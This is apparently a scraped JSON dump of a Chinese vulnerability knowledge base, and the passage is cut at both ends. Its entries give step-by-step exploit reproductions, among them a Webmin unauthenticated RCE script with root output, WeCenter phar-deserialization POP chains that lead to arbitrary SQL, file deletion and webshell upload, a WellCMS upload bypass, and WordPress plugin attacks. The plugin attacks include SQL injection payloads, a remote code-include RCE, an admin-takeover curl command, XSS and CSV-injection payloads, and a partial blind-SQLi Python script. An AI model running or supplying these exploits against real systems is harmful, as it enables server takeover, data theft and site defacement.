user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2 python usage: python CVE_2019_15107.py https://0-sec.org:10000 cmd C:\\Users\\CTF\\Desktop>python CVE_2019_15107.py https://10.10.20.166:10000 id _______ _______ _______ _______ __ _____ __ _______ __ _______ ______ ( ____ \\|\\ /|( ____ \\ / ___ )( __ )/ \\ / ___ \\ / \\ ( ____ \\/ \\ ( __ )/ ___ \\ | ( \\/| ) ( || ( \\/ \\/ ) || ( ) |\\/) ) ( ( ) ) \\/) ) | ( \\/\\/) ) | ( ) |\\/ ) ) | | | | | || (__ / )| | / | | | ( (___) | | | | (____ | | | | / | / / | | ( ( ) )| __) _/ / | (/ /) | | | \\____ | | | (_____ \\ | | | (/ /) | / / | | \\ \\_/ / | ( / _/ | / | | | | ) | | | ) ) | | | / | | / / | (____/\\ \\ / | (____/\\ ( (__/\\| (__) |__) (_/\\____) ) __) (_/\\____) )__) (_| (__) | / / (_______/ \\_/ (_______/_____\\_______/(_______)\\____/\\______/_____\\____/\\______/ \\____/(_______) \\_/ (_____) (_____) python By jas502n vuln_url= https://0-sec.org:10000/password_change.cgi Command Result = uid=0(root) gid=0(root) groups=0(root) 四、参考链接 https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html https://www.exploit-db.com/exploits/47230 https://blog.firosolutions.com/exploits/webmin/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-15 21:43:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/WeCenter/WeCenter 3.3.4 前台sql注入.html":{"url":"0day/WeCenter/WeCenter 3.3.4 前台sql注入.html","title":"WeCenter 3.3.4 前台sql注入","keywords":"","body":"WeCenter 3.3.4 前台sql注入 一、漏洞简介 二、漏洞影响 WeCenter 3.3.4 三、复现过程 任意sql语句执行 system/aws_model.inc.php:__destruct() 方法中存在任意 SQL 语句执行。 poc _shutdown_query = $_shutdown_query; } } $sql = array('select updatexml(1,concat(0x3a,md5(233),0x3a),1)'); $evilobj = new AWS_MODEL($sql); // phar.readonly无法通过该语句进行设置: init_set(\"phar.readonly\",0); $filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar->startBuffering(); $phar->setStub(\"GIF89a\"); $phar->setMetadata($evilobj); $phar->addFromString(\"foo.txt\",\"bar\"); $phar->stopBuffering(); ?> 利用 首先注册账号，并利用上面的poc生成Phar文件，并将运行后将生成的shell.gif通过编辑器的上传功能上传到服务器上。 记录下上传后的目录 生成并设置COOKIE中的WXConnect值 '1'); $arr['access_user'] = array(); $arr['access_user']['openid'] = 1; $arr['access_user']['nickname'] = 'naiquan'; $arr['access_user']['headimgurl'] = 'phar://uploads/question/20200107/a3df6f75e11120c22ba0d85519c5d442.gif'; echo json_encode($arr); ?> 将headimgurl的值设置成phar伪协议解析的恶意文件后运行，将结果放入Cookie中，前缀可参考Cookie中的其他参数。 访问app/m/weixin.php下的binding_action 提示绑定微信成功后进行下一步 访问app/account/ajax.php下的synch_img_action 任意SQL语句执行成功 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-22 21:52:52 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/WeCenter/WeCenter 3.3.4 任意文件删除.html":{"url":"0day/WeCenter/WeCenter 3.3.4 任意文件删除.html","title":"WeCenter 3.3.4 任意文件删除","keywords":"","body":"WeCenter 3.3.4 任意文件删除 一、漏洞简介 二、漏洞影响 WeCenter 3.3.4 三、复现过程 任意文件删除 system/Zend/Http/Response/Stream.php:__destruct() 方法中存在任意文件删除。 poc _cleanup = true; $this->stream_name = $stream_name; } } $stream_name = '/var/www/html/wecenter334/shell.php'; $evilobj = new Zend_Http_Response_Stream($stream_name); // phar.readonly无法通过该语句进行设置: init_set(\"phar.readonly\",0); $filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar->startBuffering(); $phar->setStub(\"GIF89a\"); $phar->setMetadata($evilobj); $phar->addFromString(\"foo.txt\",\"bar\"); $phar->stopBuffering(); ?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-22 21:40:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/WeCenter/WeCenter 3.3.4 远程命令执行.html":{"url":"0day/WeCenter/WeCenter 3.3.4 远程命令执行.html","title":"WeCenter 3.3.4 远程命令执行","keywords":"","body":"WeCenter 3.3.4 远程命令执行 一、漏洞简介 二、漏洞影响 WeCenter 3.3.4 三、复现过程 远程命令执行 WeCenter 后台的 允许的附件文件类型 处，设置了用户可上传的文件类型后缀。而这个配置是写在数据库中的，我们可以利用前面的任意 SQL 语句执行的 POP 链，往字段中添加 php 文件后缀。 poc _shutdown_query = $_shutdown_query; } } $sql = array('update aws_system_setting set value=\\'s:45:\"jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php\";\\' where varname=\\'allowed_upload_types\\''); $evilobj = new AWS_MODEL($sql); // phar.readonly无法通过该语句进行设置: init_set(\"phar.readonly\",0); $filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar->startBuffering(); $phar->setStub(\"GIF89a\"); $phar->setMetadata($evilobj); $phar->addFromString(\"foo.txt\",\"bar\"); $phar->stopBuffering(); ?> 利用 这里以 RCE 利用为例子。我们先用上面的 EXP 生成文件，然后找个可以上传文件的地方。这里要注意，一定不要选择在用户头像处上传。这里我们通过发起问题的地方来上传文件。 通过如下数据包，将 headimgurl 插入数据库中（ Cookie 前缀每个网站都不一样，修改成自己的即可）。 GET /wecenter334/?/m/weixin/binding/ HTTP/1.1 Host: 0.0.0.0 Cookie: XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=akl7d5skae6ebea69bp8r1b4f0; CNZZDATA1273638993=564846603-1579067041-%7C1579097763; xhj__user_login=NcIFvaZbkaxoQfofEGo%2FSOCyrXq5R0lZofmF9uqaJHO5tpVyag7GEP3fdh9hKvPUf8Xj4x3kkxgLXcf1L4wocSQu9BUquhozfdiEN2Hfg8vj73XVn1f09yLfbpfbVs7K; xhj__WXConnect={\"access_token\":{\"openid\":1},\"access_user\":{\"headimgurl\":\"phar:\\/\\/uploads\\/question\\/20200116\\/f39510a7e8e47e3e4dcabbadeedd12f7.gif\",\"nickname\":\"mochazz\"}} Connection: close $wx = array( 'access_token' => array('openid'=>1), 'access_user' => array('headimgurl'=>'phar:///uploads/question/20200116/f39510a7e8e47e3e4dcabbadeedd12f7.gif','nickname'=>'mochazz') ); echo json_encode($wx); 接着通过如下数据包触发 phar反序列化 执行 SQL 语句。 GET /wecenter334/?/account/ajax/synch_img/ HTTP/1.1 Host: 0.0.0.0 Cookie: XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=qb72k9k1sl53gqibbg53nf32o1; CNZZDATA1273638993=564846603-1579067041-%7C1579137884; xhj__user_login=N9hSYaQOjPMdtxOXo9jQuCVQSykmK88gl3DTI4AmL%2BnhLpgnHFGGSHkzxAPYaVMbXo%2FAndADc%2FaD0wytUEK71YrLmxWCuEZDCSwn9b0ApyOpcIKa6E4cOotHqZpZwVq%2B Connection: close 现在，我们就可以随意上传 webshell 了。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-22 21:54:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/WellCMS/WellCMS 2.0 Beta3 后台任意文件上传.html":{"url":"0day/WellCMS/WellCMS 2.0 Beta3 后台任意文件上传.html","title":"WellCMS 2.0 Beta3 后台任意文件上传","keywords":"","body":"WellCMS 2.0 Beta3 后台任意文件上传 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 根据漏洞定位代码文件：route/attach.php，代码如下： if ($action == 'create') { // hook attach_create_start.php user_login_check(); // hook attach_create_check_after.php $backstage = param(2, 0); $width = param('width', 0); $height = param('height', 0); $is_image = param('is_image', 0); // 图片 $name = param('name'); $data = param_base64('data'); $mode = param('mode', 0); // 上传类型 1主图 $filetype = param('filetype'); // 压缩图片后缀jpeg jpg png等 $convert = param('convert', 0); // 图片转换压缩 = 1 $n = param('n', 0); // 对应主图赋值 $type = param('type', 0); // type = 0则按照SESSION数组附件数量统计，type = 1则按照传入的n数值 // hook attach_create_before.php // 允许的文件后缀名 //$types = include _include(APP_PATH.'conf/attach.conf.php'); //$allowtypes = $types['all']; empty($group['allowattach']) AND $gid != 1 AND message(2, '您无权上传'); // hook attach_create_center.php empty($data) AND message(1, lang('data_is_empty')); //$data = base64_decode_file_data($data); $size = strlen($data); $size > 20480000 AND message(1, lang('filesize_too_large', array('maxsize' => '20M', 'size' => $size))); // hook attach_create_file_ext_start.php // 获取文件后缀名 111.php.shtmll $ext = file_ext($name, 7); $filetypes = include APP_PATH . 'conf/attach.conf.php'; // hook attach_create_file_ext_before.php //主图必须为图片 if ($is_image == 1 && $mode == 1 && !in_array($ext, $filetypes['image'])) message(1, lang('well_up_picture_error')); // hook attach_create_file_ext_center.php // 如果文件后缀不在规定范围内 改变后缀名 //!in_array($ext, $filetypes['all']) AND $ext = '_' . $ext; if (!in_array($ext, $filetypes['all'])) { $ext = '_' . $ext; } else { // CMS上传图片 $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype; } // hook attach_create_file_ext_after.php $tmpanme = $uid . '_' . xn_rand(15) . '.' . $ext; // hook attach_create_tmpanme_after.php $tmpfile = $conf['upload_path'] . 'tmp/' . $tmpanme; // hook attach_create_tmpfile_after.php $tmpurl = $conf['upload_url'] . 'tmp/' . $tmpanme; // hook attach_create_tmpurl_after.php $filetype = attach_type($name, $filetypes); // hook attach_create_save_before.php file_put_contents($tmpfile, $data) OR message(1, lang('write_to_file_failed')); // hook attach_create_save_after.php // 保存到 session，发帖成功以后，关联到帖子。 // save attach information to session, associate to post after create thread. // 抛弃之前的 $_SESSION 数据，重新启动 session，降低 session 并发写入的问题 // Discard the previous $_SESSION data, restart the session, reduce the problem of concurrent session write sess_restart(); empty($t) AND empty($_SESSION['tmp_files']) AND $_SESSION['tmp_files'] = array(); $t == 1 AND empty($_SESSION['tmp_website_files']) AND $_SESSION['tmp_website_files'] = array(); // hook attach_create_after.php // type = 0则按照SESSION数组附件数量统计，type = 1则按照传入的n数值 empty($type) AND $n = ($t == 1) ? count($_SESSION['tmp_website_files']) : count($_SESSION['tmp_files']); $filesize = filesize($tmpfile); $attach = array( 'backstage' => $backstage, // 0前台 1后台 'url' => $backstage ? '../' . $tmpurl : '' . $tmpurl, 'path' => $tmpfile, 'orgfilename' => $name, 'filetype' => $filetype, 'filesize' => $filesize, 'width' => $width, 'height' => $height, 'isimage' => $is_image, 'downloads' => 0, 'aid' => '_' . $n ); // hook attach_create_array_after.php if ($mode == 1) { // hook attach_create_thumbnail_beofre.php $_SESSION['tmp_thumbnail'] = $attach; // hook attach_create_thumbnail_after.php } else { // hook attach_create_website_files_beofre.php // 0 BBS 1 CMS $t == 1 ? $_SESSION['tmp_website_files'][$n] = $attach : $_SESSION['tmp_files'][$n] = $attach; // hook attach_create_website_files_after.php } // hook attach_create_session_after.php unset($attach['path']); // hook attach_create_end.php message(0, $attach); } 大致流程： 1、 首先，接受相关参数，将filetype自行设置成“php”： $data = param_base64('data'); $filetype = param('filetype'); / 2、 进行逻辑判断： if (!in_array($ext, $filetypes['all'])) { $ext = '_' . $ext; } else { // CMS上传图片 $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype; } 3、 最后成功写入： $tmpanme = $uid . '_' . xn_rand(15) . '.' . $ext; // hook attach_create_tmpanme_after.php $tmpfile = $conf['upload_path'] . 'tmp/' . $tmpanme; // hook attach_create_tmpfile_after.php $tmpurl = $conf['upload_url'] . 'tmp/' . $tmpanme; // hook attach_create_tmpurl_after.php $filetype = attach_type($name, $filetypes); // hook attach_create_save_before.php file_put_contents($tmpfile, $data) OR message(1, lang('write_to_file_failed')); 漏洞复现 第一步，登陆该CMS后台： 第二步，进入“后台管理“，定位利用点，点击下图红框中图片进行上传： 上传并抓取数据包： 第三步，修改post包中“filetype”参数类型为“php”；经分析 “data”参数为base64加密，这里我们将测试数据“”经过base64加密等构造，形成“data”参数的数据：data%3Aimage%2Fjpeg%3Bbase64%2CPD9waHAgcGhwaW5mbygpOz8%2B，最后数据包放行，返回成功上传为php文件的路径： 最后，尝试访问，成功： 参考链接 https://xz.aliyun.com/t/7284 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-10 14:06:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/2.html":{"url":"0day/Wordpress/2.html","title":"WordPress Plugin - Google Review Slider 6.1 SQL Injection ","keywords":"","body":"WordPress Plugin - Google Review Slider 6.1 SQL Injection 一、漏洞简介 二、漏洞影响 三、复现过程 inurl:\"/wp-content/plugins/wp-google-places-review-slider/\" POC : GET/wp-admin/admin.php?page=wp_google-templates_posts&tid=1&_wpnonce=*** &taction=edit HTTP/1.1 sqlmap result sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests: --- Parameter: tid (GET) Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: page=wp_google-templates_posts&tid=1 AND (SELECT 5357 FROM (SELECT(SLEEP(5)))kHQz)&_wpnonce=***&taction=edit 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-20 23:06:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/15.html":{"url":"0day/Wordpress/15.html","title":"WordPress Plugin - NextGEN Gallery <= 3.2.2 RCE ","keywords":"","body":"WordPress Plugin - NextGEN Gallery 一、漏洞简介 WordPress插件NextGEN Gallery 当zip压缩文件包含大量图片时将导致处理进程崩溃，而临时目录没有删除。如果在zip压缩包中放置一个php文件，那么该php文件会被解压到临时目录造成RCE漏洞。 官方在2019年6月4日发布了3.2.4版本修复了漏洞。 二、漏洞影响 三、复现过程 第1步：制作Zip压缩包 我制作了一个包含800张图片和1个恶意php文件（abc233.php）的zip压缩包，图片都是几KB的小图片，恶意php文件的功能是往上级目录写入webshell，abc233.php文件内容如下： '); ?> 第2步：上传zip压缩包 点击“Add Gallery / Images”然后上传zip压缩包。 第3步：查看临时目录 点击“import folder”，再点击“uploads”即可看到解压的临时目录。 第4步：生成webshell 访问临时目录下的abc233.php文件即可在/wp-content/uploads目录下生成webshell。 http://0-sec.org/wp-content/uploads/unpacked-phpA0CB.tmp/abc233.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 22:34:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/22.html":{"url":"0day/Wordpress/22.html","title":"WordPress Plugin - Easy WP SMTP 反序列化漏洞 ","keywords":"","body":"WordPress Plugin - Easy WP SMTP 反序列化漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 我们首先搭建一个wordpress站点，安装v1.3.9版本的Easy WP SMTP，并进行相关配置。 在以下概念验证中，我将用于swpsmtp_import_settings上传一个文件，该文件包含恶意的序列化有效负载，该负载将使用户能够注册（users_can_register）并将用户默认角色（default_role）设置为数据库中的“管理员”。 1.创建一个文件名“ /tmp/upload.txt”，并添加以下内容： a:2:{s:4:\"data\";s:81:\"a:2:{s:18:\"users_can_register\";s:1:\"1\";s:12:\"default_role\";s:13:\"administrator\";}\";s:8:\"checksum\";s:32:\"3ce5fb6d7b1dbd6252f4b5b3526650c8\";} 2.上传文件 $ curl https://0-sec.org/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt' 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-23 13:57:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/23.html":{"url":"0day/Wordpress/23.html","title":"WordPress Plugin - Quizlord 2.0 XSS ","keywords":"","body":"WordPress Plugin - Quizlord 2.0 XSS 一、漏洞简介 二、漏洞影响 三、复现过程 首先搭建worepress，我的版本是4.4。然后进入后台下载插件Quizlord，版本是2.0。 下载、安装完成后，需要点击启用插件。 根据exploit-db给出的漏洞详情，找到触发漏洞的位置。 进入后台选择Quizlord插件 此时浏览器的地址栏正好对应poc中的referer内容，现在只要使用火狐插件hackbar并根据POC构造POST请求 点击execute即可发送该POST请求。 请求成功后，返回是一个空白页。 返回上一页并刷新即可触发该漏洞。 通过复现这个漏洞，我们可以知道它属于后台存储型XSS，且它的危害其实并不是很大。 需要进入后台，因此必须得知道后台用户的账号和密码。 下面我们来简单分析一下漏洞的成因。 漏洞成因分析 WordPress插件源码位置： \\wp4_4\\wp-content\\plugins\\ 进入Quizlord插件目录，找到quizlord.php文件。 下图是quizlord.php文件的内容 根据POC快速定位到函数。发现POST传入的数据并没有被程序过滤就写入了数据库中。 四、参考链接 https://www.freebuf.com/vuls/189814.html https://www.exploit-db.com/exploits/45307/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-23 14:51:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/25.html":{"url":"0day/Wordpress/25.html","title":"WordPress Plugin - AutoSuggest sql注入 ","keywords":"","body":"WordPress Plugin - AutoSuggest sql注入 一、漏洞简介 WP AutoSuggest这款插件在访问者输入关键字时，插件会在提交搜索查询之前通过AJAX请求在网页中显示一些建议。访问者可以通过按Enter继续搜索，或者访问者可以使用键盘箭头直接访问建议的帖子。 二、漏洞影响 三、复现过程 首先我们得进入exploit-db网站上下载这个存在漏洞的版本的插件原始码和本地构建WordPress网站（本地构建WordPress这里就不说了）。下载源码，如下图所示 下载完成之后，把wp-autosuggest目录直接拖到Wordpress目录的\\wp-content\\plugins\\下。 接着，登录后台，启用这款插件，如下图所示： 启用后，退出后台，如下图所示： 然后根据exploit-db网站上给出的漏洞详情，我们访问下面的URL： http://www.0-sec.org/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1 访问后，网页内容如下图所示： 根据exploit-db网站上给出的漏洞详情，我们也知道了wpas_keys参数存在注入，于是我们可以使用SQLMAP注入神器，对网站进行注入。SQLMAP命令如下： sqlmap.py -u \"http://www.0-sec.org/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1*\" --technique BT --dbms MYSQL --risk 3 --level 5 --tamper space2comment 一开始，笔者使用的时php5.2.17+Apache的环境，结果复现不了，头疼了半天，如下图： 后来笔者换了一个php-5.4.45+Apache的环境，就解决了。 通过SQLMAP，成功获取到服务器的一些信息，如下图所示： 下图也成功跑出了当前数据库的名称。 漏洞分析 分析WordPress插件的话还是挺容易的。文件和代码也不是很多，用Notepad++就够用啦。进入插件根目录下面就看到了autosuggest_functions.php、autosuggest.php这两个php文件。 下面是autosuggest.php文件所有代码： '; global $wpdb; $wpas_keys = str_replace(' ','%',$wpas_keys); $pageposts = $wpdb->get_results(\"SELECT * FROM $wpdb->posts WHERE (post_title LIKE '%$wpas_keys%') AND post_status = 'publish' ORDER BY post_date DESC\"); foreach ($pageposts as $post) { setup_postdata($post); echo \"\"; the_title(); echo \"\"; } echo ''; die(); } define('AUTOSUGGEST_DIR', get_option('siteurl') . '/' . PLUGINDIR.'/'.dirname(plugin_basename(__FILE__))); function add_autosuggest_css() { wp_register_style('autosuggestCSS', AUTOSUGGEST_DIR . '/css/wp_autosuggest.css', null, '1', 'screen'); wp_enqueue_style('autosuggestCSS'); } function add_autosuggest_js() { wp_register_script('autosuggestJS', AUTOSUGGEST_DIR . '/js/wp.autosuggest.js', null, '1'); wp_enqueue_script('autosuggestJS'); } function add_autosuggest_footer_code() { ?> var autosuggest_options = { script: \"/autosuggest.php?wpas_action=query&\", varname: \"wpas_keys\", shownoresults:true, noresults:\"\", timeout:15000, callback:autosuggestSelected, maxresults: }; var as = new AutoSuggest('', autosuggest_options); function autosuggestSelected(entry) { document.location = entry['id']; } WP AutoSuggest settings updated. WP AutoSuggest Settings Search Input ID \" id=\"wpas_input_id\" name=\"wpas_input_id\"/> Default value is 's' which is used with the default WordPress theme. Max Results \" id=\"wpas_maxresults\" name=\"wpas_maxresults\"/> Maximum number of suggested results (10 by default). 相信大家没看几行就看出了问题的所在，变量wpas_keys是直接获取GET中的wpas_keys。一点都没过滤，并且在下面代码中，变量wpas_keys也带入数据库中查询了（wpdb是wordpress操作数据库方法），于是SQL注入就产生了。 四、参考链接 https://www.exploit-db.com/exploits/45977 https://www.freebuf.com/vuls/191869.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-23 15:08:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/26.html":{"url":"0day/Wordpress/26.html","title":"WordPress Plugin - Social Warfare<=3.5.2 RCE ","keywords":"","body":"WordPress Plugin - Social Warfare 一、漏洞简介 2019年3月21日插件作者紧急发布了3.5.3版本以修复高危的RCE漏洞，在 二、漏洞影响 三、复现过程 漏洞分析 在/wp-content/plugins/social-warfare/lib/utilities/SWP_Database_Migration.php文件中有一处eval()函数，该函数将file_get_contents()读取的文件内容当做PHP代码执行导致RCE。 漏洞利用 第一步：刺探是否安装了Social Warfare插件 访问 http://0-sec.org/wp-content/plugins/social-warfare/readme.txt 如果存在readme.txt文件则说明已经安装该插件，并且从该txt文件中可获知插件的版本。 我的本机环境为3.5.2版本。 第二步：在自己的VPS服务器上放置一个code.txt文件，并启动HTTP服务使该文件可通过HTTP访问。文件内容如下： eval($_REQUEST['wpaa']) 第三步：在未登陆任何账号的情况下直接访问如下链接即可getshell。 http://0-sec.org/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://your_ip/code.txt&wpaa=phpinfo(); 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-23 15:17:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/28.html":{"url":"0day/Wordpress/28.html","title":"WordPress Plugin - Search Meter 2.13.2 CSV Injection ","keywords":"","body":"WordPress Plugin - Search Meter 2.13.2 CSV Injection 一、漏洞简介 二、漏洞影响 三、复现过程 首先在搜索框里输入paylaod =cmd|' /C notepad'!'A1' 然后访问 http://www.0-sec.org/wordpress/wp-admin/index.php?page=search-meter%2Fadmin.php 并且到处csv文件 之后，我们在Excel中打开文件，并使用逗号作为分隔符从外部文件导入数据 这时候payload就会被执行了 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 16:10:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/24.html":{"url":"0day/Wordpress/24.html","title":"（CVE-2018-19287）WordPress Plugin - Ninja Forms 3.3.17 XSS","keywords":"","body":"（CVE-2018-19287）WordPress Plugin - Ninja Forms 3.3.17 XSS 一、漏洞简介 Ninja Forms是WordPress的终极免费表单创建工具。使用简单但功能强大的拖放式表单创建器在几分钟内构建表单。对于初学者，可以快速轻松地设计复杂的表单，绝对没有代码。对于开发人员，利用内置的钩子，过滤器，甚至自定义字段模板，使用Ninja Forms作为框架，在表单构建或提交的任何步骤中执行您需要的任何操作。 二、漏洞影响 三、复现过程 下面是我从exploit-db上复制的POC，为了方便判断，修改了弹窗的内容。 http://0-sec.org/wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date&end_date=\">http://0-sec.org/wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date=\">http://0-sec.org/wp-admin/edit.php?post_status=trash&post_type=nf_sub&form_id=1\">alert(/POC3/);&nf_form_filter&paged=1 我们只要直接复制POC到浏览器的地址栏回车即可触发漏洞。 下图是触发第一个POC的图： 下图是触发第二个POC的图： 下图是触发第三个POC的图： 漏洞分析过程 笔者直接从POC方面入手，简单分析一下漏洞的成因。由于方法是一样的，笔者是一个懒人，这里就只分析了POC3的成因。 通过POC查找关键词nf_sub，确定了核心文件\\wp-content\\plugins\\ninja-forms\\includes\\Admin\\Menus\\Submissions.php。 下图是Submissions.php部分内容： 通过粗略的阅读，发现这个函数是导致POC3成功弹窗的关键。 下图是Submissions.php文件第71-104行内容： public function change_views( $views ) { // Remove our unused views. unset( $views[ 'mine' ] ); unset( $views[ 'publish' ] ); // If the Form ID is not empty... if( ! empty( $_GET[ 'form_id' ] ) ) { // ...populate the rest of the query string. $form_id = '&form_id=' . $_GET[ 'form_id' ] . '&nf_form_filter&paged=1'; } else { // ...otherwise send in an empty string. $form_id = ''; } // Build our new views. $views[ 'all' ] = '' . __( 'Completed', 'ninja-forms' ) . ''; $views[ 'trash' ] = '' . __( 'Trashed', 'ninja-forms' ) . ''; // Checks to make sure we have a post status. if( ! empty( $_GET[ 'post_status' ] ) ) { // Depending on the domain set the value to plain text. if ( 'all' == $_GET[ 'post_status' ] ) { $views[ 'all' ] = __( 'Completed', 'ninja-forms' ); } else if ( 'trash' == $_GET[ 'post_status' ] ) { $views[ 'trash' ] = __( 'Trashed', 'ninja-forms' ); } } return $views; } 从上面代码，我们可以看到，form_id并没有被过滤，导致XSS存在。 $form_id = '&form_id=' . $_GET[ 'form_id' ] . '&nf_form_filter&paged=1'; 四、参考链接 https://www.exploit-db.com/exploits/45880/ https://www.freebuf.com/vuls/190411.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-23 14:58:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/21.html":{"url":"0day/Wordpress/21.html","title":"（CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入","keywords":"","body":"（CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 环境搭建 运行环境很简单，只是在vulapps的基础环境的上加了xdebug调试插件，把docker容器作为远程服务器来进行调试。 Dockerfile文件: FROM medicean/vulapps:base_lamp_php7 RUN pecl install xdebug COPY php.ini /etc/php/7.0/apache2/ COPY php.ini /etc/php/7.0/cli/ docker-compose文件: version: '3' services: lamp-php7: build: . ports: - \"80:80\" volumes: - \"/Users/mengchen/Security/Code Audit/html:/var/www/html\" - \"/Users/mengchen/Security/Code Audit/tmp:/tmp\" php.ini中xdebug的配置 [xdebug] zend_extension=\"/usr/lib/php/20151012/xdebug.so\" xdebug.remote_enable=1 xdebug.remote_host=10.254.254.254 xdebug.remote_port=9000 xdebug.remote_connect_back=0 xdebug.profiler_enable=0 xdebug.idekey=PHPSTORM xdebug.remote_log=\"/tmp/xdebug.log\" 因为我是在Mac上，所以要给本机加一个IP地址，让xdebug能够连接 sudo ifconfig lo0 alias 10.254.254.254 PHPStorm也要配置好相对路径: 插件下载地址: https://downloads.wordpress.org/plugin/form-maker.1.13.3.zip WordPress使用最新版就可以，在这里我使用的版本是5.2.2，语言选的简体中文。 PS: WordPress搭建完毕后，记得关闭自动更新。 POC http://0-sec.org/wp-admin/admin.php?page=submissions_fm&task=display&current_id=2&order_by=group_id&asc_or_desc=,(case+when+(select+ascii(substring(user(),1,1)))%3d114+then+(select+sleep(5)+from+wp_users+limit+1)+else+2+end)+asc%3b Python脚本，修改自exploit-db #coding:utf-8 import requests import time vul_url = \"http://127.0.0.1/wp-admin/admin.php?page=submissions_fm&task=display&current_id=2&order_by=group_id&asc_or_desc=\" S = requests.Session() S.headers.update({\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en;q=0.8,zh;q=0.5,en-US;q=0.3\", \"Referer\": \"http://127.0.0.1/wp-login.php?loggedout=true\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"}) length = 0 TIME = 3 username = \"admin\" password = \"admin\" def login(username, password): data = { \"log\": \"admin\", \"pwd\": \"admin\", \"wp-submit\": \"\\xe7\\x99\\xbb\\xe5\\xbd\\x95\", \"redirect_to\": \"http://127.0.0.1/wp-admin/\", \"testcookie\": \"1\" } r = S.post('http://127.0.0.1/wp-login.php', data=data, cookies = {\"wordpress_test_cookie\": 